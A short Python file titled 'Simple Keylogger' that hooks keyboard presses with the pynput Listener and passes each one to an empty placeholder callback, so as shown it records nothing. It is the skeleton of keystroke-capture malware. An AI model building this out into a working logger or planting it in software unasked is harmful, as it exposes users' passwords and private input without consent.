# Simple Keylogger
from pynput.keyboard import Listener

def function(*args, **kwargs):...

def on_press(callback=function):
	with Listener(callback) as l:
		try:
			l.join()
		except KeyboardInterrupt:
			print('\n[ LOG ] - EXIT.\n')
